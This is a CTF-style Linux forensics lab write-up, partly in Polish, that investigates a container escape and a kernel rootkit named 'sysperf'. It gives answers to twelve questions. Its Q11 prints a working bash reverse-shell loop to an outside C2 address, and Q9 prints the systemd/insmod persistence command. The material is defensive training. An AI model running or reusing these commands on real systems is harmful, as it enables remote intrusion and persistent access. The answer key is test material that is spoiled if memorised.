# ContainerBreak - Rootkit Trail Lab
## Scenario
Following the network intrusion, the attacker successfully escaped from the container to the underlying Linux host system. After killing the packet capture process, the attacker uploaded malicious files, installed a kernel level rootkit, and carefully removed all installation artifacts before disconnecting.
Days later, the compromised server exhibited suspicious behavior - hidden processes, unexplained network connections, and system instability. A complete forensic collection was performed on the live system to investigate the extent of the compromise and identify the attacker's persistence mechanisms.

## Tools
Pliki wejściowe do analizy zabezpieczono narzedziem Unix-like Artifacts Collector. Ciekawe narzędzie które wykonuje szereg skyrptów i pluginów zabezpieczając najważniejsze informacje i pliki z sytemu Linuxo podobnego.

## Discovery
# Q1
What is the exact kernel version of the compromised Ubuntu server?
> 5.4.0-216-generic

Wersję kernela możemy zobaczyć w kilu miejscach 

# Q2
What is the hostname of the compromised system?
> wowza

# Q3
What is the current kernel taint value at the time of collection?
> 12288

## Persistence
# Q4
A malicious kernel module was loaded on the compromised machine. What is the name of this module?
> sysperf

# Q5
At what dmesg timestamp was the rootkit module first loaded? (seconds.microseconds)
> 9127.292300

# Q6
What is the absolute UTC timestamp when the rootkit was loaded? Convert the dmesg timestamp accordingly.
> 2025-11-24 23:31

# Q7
What C2 server IP address and port are configured in the rootkit?
> 185.220.101.50:9999

# Q8
The threat actor created a systemd service to maintain persistence on the compromised machine. What is the full path to this service file?
> /etc/systemd/system/sysperf.service

# Q9
The systemd service file specifies a command to run upon startup. What is the exact command configured in this service file?
> /sbin/insmod /lib/modules/sysperf.ko

# Q10
The systemd service persistence results in a root-owned process that maintains a reverse shell loop. What is the PID of this process?
> 39303

# Q11
The rootkit maintains persistence through a reverse shell connection. What is the full command line of this persistent reverse shell?
> while true; do bash -i >& /dev/tcp/185.220.101.50/9999 0>&1; sleep 30; done

# Q12
What is the SHA256 hash of the rootkit kernel module?
<details>
  <summary>Cick</summary>
  ded20890c28460708ea1f02ef50b6e3b44948dbe67d590cc6ff2285241353fd8
</details>